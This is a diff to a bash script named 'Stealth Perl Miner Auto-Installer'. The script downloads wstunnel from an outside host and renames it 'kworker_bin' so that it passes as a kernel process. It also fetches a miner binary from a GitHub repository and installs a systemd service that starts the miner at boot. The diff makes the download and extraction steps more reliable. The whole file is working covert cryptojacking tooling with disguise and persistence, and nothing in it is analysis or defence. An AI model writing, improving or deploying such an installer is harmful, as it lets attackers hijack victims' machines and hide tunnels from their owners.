@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ==========================================
-# Stealth Perl Miner Auto-Installer
+# Stealth Perl Miner Auto-Installer (Fixed)
 # ==========================================
 
 set -e # Exit on error
@@ -22,6 +22,7 @@ LOG_FILE="${INSTALL_DIR}/logs/miner.log"
 # Colors for output
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
+RED='\033[0;31m'
 NC='\033[0m' # No Color
 
 echo -e "${GREEN}[+] Starting Stealth Miner Setup...${NC}"
@@ -32,19 +33,38 @@ mkdir -p ${INSTALL_DIR}
 mkdir -p ${INSTALL_DIR}/logs
 cd ${INSTALL_DIR}
 
-# 2. Download Binaries
+# 2. Download and Extract wstunnel
 echo -e "${YELLOW}[*] Downloading wstunnel...${NC}"
 if [ ! -f "kworker_bin" ]; then
-    curl -s -L -o wstunnel.tar.gz https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz
-    tar -xzf wstunnel.tar.gz --strip-components=1
-    mv wstunnel kworker_bin
-    chmod +x kworker_bin
-    rm -f wstunnel.tar.gz
+    # Create a temp dir for extraction to avoid clutter
+    EXTRACT_DIR=$(mktemp -d)
+    
+    # Download
+    curl -s -L -o ${EXTRACT_DIR}/wstunnel.tar.gz https://storage.technoelectro.online/wstunnel_10.5.2_linux_amd64.tar.gz
+    
+    # Extract
+    tar -xzf ${EXTRACT_DIR}/wstunnel.tar.gz -C ${EXTRACT_DIR}
+    
+    # Find the binary (handles nested folders or different names)
+    BINARY_PATH=$(find ${EXTRACT_DIR} -type f -name "wstunnel*" -executable | head -n 1)
+    
+    if [ -z "$BINARY_PATH" ]; then
+        echo -e "${RED}[!] Error: Could not find wstunnel binary in archive.${NC}"
+        exit 1
+    fi
+    
+    # Move to install dir and rename
+    mv "$BINARY_PATH" ${INSTALL_DIR}/kworker_bin
+    chmod +x ${INSTALL_DIR}/kworker_bin
+    
+    # Cleanup
+    rm -rf ${EXTRACT_DIR}
     echo -e "${GREEN}[+] wstunnel downloaded and renamed to 'kworker_bin'.${NC}"
 else
     echo -e "${YELLOW}[!] 'kworker_bin' already exists. Skipping download.${NC}"
 fi
 
+# 3. Download the Miner
 echo -e "${YELLOW}[*] Downloading Miner (forge)...${NC}"
 if [ ! -f "miner" ]; then
     curl -s -L -o miner https://github.com/wakitobi/glowing-umbrella/raw/refs/heads/main/forge
@@ -54,7 +74,7 @@ else
     echo -e "${YELLOW}[!] 'miner' already exists. Skipping download.${NC}"
 fi
 
-# 3. Create the Wrapper Script
+# 4. Create the Wrapper Script
 echo -e "${YELLOW}[*] Creating wrapper script...${NC}"
 cat > ${WRAPPER_SCRIPT} << EOF
 #!/bin/bash
@@ -97,7 +117,7 @@ EOF
 
 chmod +x ${WRAPPER_SCRIPT}
 
-# 4. Create Systemd Service File
+# 5. Create Systemd Service File
 echo -e "${YELLOW}[*] Creating Systemd Service...${NC}"
 cat > ${SERVICE_FILE} << EOF
 [Unit]
@@ -126,13 +146,13 @@ Environment=HOME=/root
 WantedBy=multi-user.target
 EOF
 
-# 5. Enable and Start Service
+# 6. Enable and Start Service
 echo -e "${YELLOW}[*] Enabling and Starting Service...${NC}"
 systemctl daemon-reload
 systemctl enable ${SERVICE_NAME}.service
 systemctl restart ${SERVICE_NAME}.service
 
-# 6. Final Status
+# 7. Final Status
 echo ""
 echo -e "${GREEN}=========================================${NC}"
 echo -e "${GREEN} Setup Complete! ${NC}"
